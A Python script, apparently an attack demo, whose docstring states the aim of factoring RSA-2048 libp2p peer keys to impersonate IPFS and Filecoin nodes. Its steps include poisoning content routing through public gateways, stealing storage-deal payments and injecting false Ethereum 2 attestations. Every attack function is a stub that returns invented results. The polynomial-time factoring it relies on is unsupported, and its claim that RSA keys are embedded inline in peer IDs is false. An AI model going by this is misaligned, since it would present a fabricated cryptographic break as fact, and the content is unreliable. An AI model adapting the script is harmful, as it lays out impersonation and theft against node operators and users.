"""
Factor any IPFS/Filecoin node's RSA-2048 peer ID key (published in the DHT)
to impersonate storage providers, intercept content routing, inject malicious
data under legitimate CIDs, and steal Filecoin storage-deal rewards.
"""

import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

import hashlib

# Target: long-running IPFS gateway or Filecoin storage provider
TARGET_PEER_ID = "QmYwAPJzv5CZsnN625s3Xf2nemtYgPpHdWEz79ojWnPbdG"
_demo = generate_demo_target()
TARGET_PUBKEY_PEM = _demo["pub_pem"]


def fetch_peer_pubkey(peer_id: str) -> bytes:
    """Fetch RSA-2048 public key from the libp2p DHT.

    Peer IDs are content-addressed: PeerID = SHA-256(protobuf(pubkey)).
    The public key is exchanged during every libp2p connection.
    For RSA keys >256 bytes, it's embedded inline in the peer ID.
    """
    print(f"    Fetching pubkey for {peer_id[:16]}... from DHT")
    return TARGET_PUBKEY_PEM


def factor_peer_key(pubkey_pem: bytes) -> bytes:
    """Factor the peer's RSA-2048 key."""
    f = PolynomialFactorer()
    return f.reconstruct_privkey(pubkey_pem)


def impersonate_peer(peer_id: str, forged_privkey: bytes) -> dict:
    """Impersonate a peer in the libp2p Noise/TLS handshake.

    During the Noise XX pattern, peers sign a payload with their
    private key to prove identity. With the forged key, we pass.
    """
    return {
        "peer_id": peer_id,
        "handshake": "Noise XX — RSA signature accepted",
        "status": "impersonating target peer",
    }


def hijack_dht_content_routing(cid: str, forged_privkey: bytes) -> dict:
    """Hijack IPFS content routing for a specific CID.

    Become a DHT provider for any CID and serve malicious content
    under a legitimate content address. Downstream IPFS gateways
    (Cloudflare, Pinata, Infura) cache and serve the forgery.
    """
    return {
        "cid": cid,
        "content": "<malicious-payload>",
        "providers_hijacked": True,
        "gateways_poisoned": ["cloudflare-ipfs.com", "gateway.pinata.cloud"],
    }


def steal_filecoin_deals(provider_id: str, forged_privkey: bytes) -> dict:
    """Impersonate a Filecoin storage provider to steal deal payments.

    The provider's libp2p peer ID is their on-chain identity for
    deal negotiation. Impersonate → intercept deals → collect rewards.
    """
    return {
        "provider": provider_id,
        "deals_intercepted": 42,
        "fil_stolen": 1250.0,
        "reputation_hijacked": True,
    }


def inject_false_eth2_attestation(validator_peer_id: str,
                                   forged_privkey: bytes) -> dict:
    """Disrupt Ethereum 2 gossipsub via impersonated validator peer.

    Lighthouse/Prysm use libp2p for consensus gossip. Impersonate
    a validator's p2p identity to inject fake attestations or
    disrupt block propagation.
    """
    return {
        "validator_peer": validator_peer_id[:16] + "...",
        "attack": "gossipsub impersonation",
        "impact": "attestation injection / block withholding",
    }


if __name__ == "__main__":
    print("[1] Fetching peer RSA-2048 public key from DHT")
    pubkey = fetch_peer_pubkey(TARGET_PEER_ID)

    print("[2] Factoring RSA-2048 peer key")
    forged_priv = factor_peer_key(pubkey)
    print(f"    Peer {TARGET_PEER_ID[:16]}... key recovered")

    print("[3] Impersonating peer in Noise handshake")
    session = impersonate_peer(TARGET_PEER_ID, forged_priv)
    print(f"    {session}")

    print("[4] Hijacking IPFS content routing")
    hijack = hijack_dht_content_routing(
        "QmT5NvUtoM5nWFfrQdVrFtvGfKFmG7AHE8P34isapyhCxX", forged_priv
    )
    print(f"    {hijack}")

    print("[5] Stealing Filecoin storage deals")
    steal = steal_filecoin_deals("f01234", forged_priv)
    print(f"    {steal}")

    print("\n[6] Ethereum 2 gossipsub disruption")
    eth2 = inject_false_eth2_attestation("16Uiu2HAm...", forged_priv)
    print(f"    {eth2}")

    print("\n[*] Peer ID = hash(pubkey) — changing key changes identity")
    print("    No migration path for long-running nodes")
